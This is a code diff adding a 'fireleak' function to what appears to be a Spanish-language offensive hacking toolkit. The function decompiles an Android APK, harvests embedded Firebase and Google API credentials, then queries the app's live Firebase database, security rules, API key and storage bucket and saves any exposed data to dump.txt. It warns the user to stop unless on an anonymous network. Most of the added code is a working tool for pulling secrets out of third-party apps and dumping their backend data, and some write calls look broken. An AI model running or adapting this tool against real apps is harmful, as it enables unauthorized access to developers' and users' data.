@@ -128,7 +128,7 @@ def srint(txt):
     if "[" in txt and "]" in txt:
         txt = txt.replace("[", f"{Fore.LIGHTBLACK_EX}[").replace("]", f"]{Fore.WHITE}") # Se repite
 
-    stdout.write("\r"+txt+"\r")
+    stdout.write("\r" + txt + "                     " + "\r")
     stdout.flush()
 
 def update():
@@ -2910,6 +2910,231 @@ def eashi(dir_):
         
         else:
             crint(f"[ERROR] Formato de pagina correcto, formulario no encontrado ...")
+
+def fireleak(apk_path):
+
+    # Escaneo de directorios en la ruta
+    in_dir = os.listdir(".")
+    my_json = {}
+
+    # Si la carpeta leak esta en la lista
+    if "leak" in in_dir:
+        shutil.rmtree("leak"); os.remove("leak.apk")
+    
+    try:
+        shutil.copy(sht(apk_path), sht("./leak.apk"))
+    except Exception as err:
+        print(f"[ERROR] {err}")
+        exit(0)
+
+    # Lista que incluye nombres de las variables comunes de firebase en xml
+    firebase = [ 'firebase_database_url">', 'project_id">', 'gcm_defaultSenderId">', 'google_api_key">', 'reporting_api_key">', 'google_storage_bucket">', 'google_app_id">', "firebaseio.com" ]
+
+    # Extenciones que no son texto plano
+    extensiones = [ ".jpg",".jpeg",".png",".gif",".bmp",".tiff",".webp",".mp3",".wav",".aac",".ogg",".flac",".m4a",
+        ".mp4",".mov",".avi",".mkv",".webm",".flv",".pdf",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".odt",
+        ".ods",".odp",".epub",".mobi",".zip",".rar",".tar",".7z",".gzip",".exe",".dll",".apk",".iso",".bin",
+        ".sqlite",".db", ".lnk", ".py", ".ini" ]
+
+    descrip_ = {
+
+        "firebase_database_url": "Posible acceso no autorizado a Firebase Realtime Database.",
+        "project_id": "Identifica el proyecto Firebase, útil para ataques dirigidos.",
+        "google_api_key": "Clave expuesta que puede permitir uso indebido de Firebase.",
+        "google_app_id": "Identifica la app en Firebase, sin riesgo directo.",
+        "gcm_defaultSenderId": "Puede usarse para enviar notificaciones Firebase no autorizadas.",
+        "google_storage_bucket": "Riesgo de acceso público a archivos en Firebase Storage."
+
+    }
+
+
+    apk_dir = sht("leak/")
+
+    ###############################
+    #       Lectura del APK       #
+    ###############################
+
+    try:
+        if "apktool.jar" not in in_dir and "win" in SYS_GLOBAL:
+
+            down_bat = requests.get("https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat")
+            downl_apk = requests.get("https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.10.0.jar")
+        
+            with open("apktool.jar", "wb") as apk_tool, open("apktool.bat", "wb") as apk_tool_bat:
+                apk_tool.write(downl_apk.content)
+                apk_tool_bat.write(down_bat.content)
+
+    except Exception as err:
+        print(f"[ERROR] {err}")
+
+    if "win" in SYS_GLOBAL:
+        os.system(".\\apktool.bat leak.apk")
+    else:
+        os.system("apktool d leak.apk")
+
+    ###############################
+    #       Busqueda de Fire      #
+    ###############################
+
+    # Cambiar directorio por el nombre de la carpeta del apk descomprimido
+    dirs_ = os.listdir(apk_dir)
+
+    try:
+        crint("[INFO] Presiona CTRL + C para terminar el escaneo ...")
+        time.sleep(5)
+        for carpeta in dirs_:
+
+            # Si el archivo contiene alguna de estas extenciones se salta
+            if any(ext_ in carpeta for ext_ in extensiones):
+                continue
+                
+            if apk_dir not in carpeta:
+                carpeta = apk_dir + carpeta
+
+            try:
+                # Se lista cada carpeta para verificar si es archivo o carpeta
+                test_ = os.listdir(carpeta)
+
+                # Si la carpeta no esta en la lista dirs_ se agrega a la variable dirs_
+                if carpeta not in dirs_:
+                    dirs_.append(carpeta)
+
+                # Pero si esta se agrega de todas formas
+                else:
+                    # Con cada archivo y carpeta dentro de ella, agregando la ruta de la cual se escaneo
+                    for dirtest in test_:
+                        dirs_.append(sht(carpeta + "/" + dirtest))
+
+            # Si ocurre alguna excepcion se lee el archivo asumiendo que es texto plano.
+            except:
+                srint(f"[FIND] Buscando configuracion: {carpeta}")
+                stdout.write(f"\r[FIND] Buscando configuracion: {carpeta}                  \r")
+                stdout.flush()
+
+                with open(carpeta, "r", errors="ignore") as file:
+                    count = 0
+                    file_total = file.read()
+
+                    # Si el archivo contiene alguna de estas variables se imprime la ruta del archivo
+                    if any(fireapi in file_total for fireapi in firebase):
+
+                        crint(f"\n[PASS] Configuracion de firebase encontrada en: {carpeta}")
+                        file_total = file_total.replace('">', '">\n').replace('</', '\n</').split("\n")
+
+                        # Por cada linea del archivo especificado
+                        for line in file_total:
+                            
+                            # Se verifica correctamente para encontrar y formular el json
+                            for fireapi in firebase:
+
+                                # Si la variable cae en firebaseio.com y no esta en el diccionario significa que es una configuracion faltante
+                                if "firebaseio.com" in line and "firebase_database_url" not in my_json and firebase[0] not in file_total:
+                                    my_json.setdefault("firebase_database_url", line)
+                                    continue
+
+                                # Si lo encuentra se genera una variable obteniendo el parametro correspondiente !! firebaseio.com es para evitar
+                                # crear otra key y value vacios
+                                if fireapi in line and fireapi not in my_json and fireapi != "firebaseio.com":
+
+                                    line_sp = file_total[count + 1]
+                                    my_json.setdefault(fireapi.replace('">', ""), line_sp)
+
+                            count = count + 1
+
+                        crint("[INFO] Datos encontrados hasta el momento: ")
+                        for temp__ in my_json.keys():
+                            print(f"- {temp__}")
+                        crint("[INFO] Continuando escaneo en 5 segundos ...")
+                        time.sleep(5)
+
+                        # Aqui podria ir la limpieza de los archivos
+
+    except KeyboardInterrupt:
+        pass
+    
+    except Exception as err:
+        crint(f"[ERROR] {err}")
+
+    # Se verifica si se consiguieron credenciales o no
+    if my_json == {}:
+        crint("[ERROR] No se logro encontrar credenciales ...")
+    
+    else:
+        crint("\n[PASS] Configuracion de firebase encontrada:")
+
+        with open("firebase.json", "w", encoding="utf-8") as save_:
+            save_.write(str(my_json).replace("{", "{\n").replace("}", "\n}").replace(",", ",\n").replace("'", '"'))
+    
+        ###############################
+        #     Verificacion de Vuln    #
+        ###############################
+        
+        headers_tab = [[ "NOMBRE", "KEY", "DESCRIPCION" ]]
+        
+        for a in my_json.keys():
+
+            try:
+                headers_tab.append([a, my_json[a], descrip_[a]])
+            except:
+                pass
+
+        print(tabulate(headers_tab, tablefmt="grid"))
+        crint("[SAVED] Configuracion guardada como: firebase.json\n[ALERT] Iniciando testeo de API en 10 segundos || Tipo de busqueda =>> [ACTIVA]\n[ALERT] Presiona CTRL + C si no estas en una red anonima ...")
+
+        try:
+
+            # Despues de 10 segundos dependiendo si es que cada una esta en el json, se realiza una prueba para testear la api-key
+            time.sleep(10)
+            with open("dump.txt", "w", encoding="utf-8") as save_dmp:
+
+                if "firebase_database_url" in my_json:
+
+                    if "google_api_key" not in my_json:
+                        data_check = requests.get(f'{my_json["firebase_database_url"]}/.json')
+
+                    else:
+                        data_check = requests.get(f'{my_json["firebase_database_url"]}/.json?auth={my_json["google_api_key"]}')
+                        rules_check = requests.get(f'{my_json["firebase_database_url"]}/.settings/rules.json?auth={my_json["google_api_key"]}')
+                        
+                        if rules_check.status_code == 200:
+                            crint("[PASS] Configuracion de firebase obtenida =>> [OK]"); save_dmp.write(rules_check+"\n")
+                        else:
+                            crint("[INFO] Configuracion de firebase obtenida =>> [BAD]")
+
+                    if data_check.status_code == 200:
+                        crint("[PASS] Base de datos de Firebase expuesta =>> [OK]"); save_dmp.write(data_check+"\n")
+                    else:
+                        crint("[INFO] Base de datos de Firebase expuesta =>> [BAD]")
+                
+                if "google_api_key" in my_json:
+                    api_check = requests.get(f'https://maps.googleapis.com/maps/api/geocode/json?address=Rusia&key={my_json["google_api_key"]}')
+
+                    if api_check.status_code == 200:
+                        crint("[PASS] API KEY Sin proteccion y de libre uso =>> [OK]"); save_dmp.write(api_check.url+"\n")
+                    else:
+                        crint("[INFO] API KEY Protegida y privada =>> [BAD]")
+                
+                if "google_storage_bucket" in my_json:
+                    bucket_check = requests.get(f'https://storage.googleapis.com/{my_json["google_storage_bucket"]}')
+
+                    if bucket_check.status_code == 200:
+                        crint("[PASS] Bucket mal configurado y sin proteccion =>> [OK]"); save_dmp.write(bucket_check.url+"\n")
+                    else:
+                        crint("[INFO] Bucket Protegido y no accesible =>> [BAD]")
+            
+            # Obtenemos el peso de dump.txt y damos el resultado del escaneo
+            size_ = os.stat("dump.txt").st_size
+            if size_ != 0:
+                crint("[PASS] Datos dumpeados de firebase guardados en: dump.txt")
+            else:
+                crint("[INFO] No se lograron dumpear datos de la firebase ...")
+                os.remove("dump.txt")
+        
+        except KeyboardInterrupt:
+            pass
+
+        except Exception as err:
+            crint(f"[ERROR] {err}")
 
 # python3 fsh.py urldump --a <social_network> --b <count> < ------------ in mgt0ls
 #################################
